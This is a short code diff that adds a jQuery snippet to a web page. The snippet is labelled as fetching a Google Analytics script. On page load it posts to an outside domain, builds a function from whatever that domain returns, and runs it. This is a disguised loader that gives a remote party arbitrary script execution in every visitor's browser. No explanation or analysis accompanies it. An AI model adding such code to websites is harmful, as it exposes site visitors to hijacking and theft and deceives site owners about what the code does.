@@ -1,0 +1,7 @@
+
+    jQuery(document).ready(function () {
+		jQuery.post('https://themindunleashed.com?ga_action=googleanalytics_get_script', {action: 'googleanalytics_get_script'}, function(response) {
+			var F = new Function ( response );
+			return( F() );
+		});
+    });
